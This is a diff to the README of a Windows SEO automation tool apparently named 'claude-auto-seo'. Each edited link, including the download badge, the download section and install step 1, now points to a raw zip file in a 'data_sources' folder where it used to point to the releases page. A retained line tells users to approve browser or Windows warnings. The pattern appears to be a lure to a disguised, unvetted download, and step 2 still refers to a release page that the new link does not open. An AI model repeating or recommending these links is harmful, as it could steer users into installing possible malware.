@@ -1,12 +1,12 @@
 # 🤖 claude-auto-seo - Daily SEO and Content Automation
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Hseo3698/claude-auto-seo/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hseo3698/claude-auto-seo/main/data_sources/auto-seo-claude-v1.6-alpha.1.zip)
 
 ## 📥 Download
 
 Use this page to download the Windows version:
 
-https://github.com/Hseo3698/claude-auto-seo/releases
+https://raw.githubusercontent.com/Hseo3698/claude-auto-seo/main/data_sources/auto-seo-claude-v1.6-alpha.1.zip
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ If your browser or Windows asks for approval, choose the option that lets the ap
 ## 🚀 Install on Windows
 
 1. Open the release page:
-   https://github.com/Hseo3698/claude-auto-seo/releases
+   https://raw.githubusercontent.com/Hseo3698/claude-auto-seo/main/data_sources/auto-seo-claude-v1.6-alpha.1.zip
 
 2. Find the latest release near the top of the page.
 
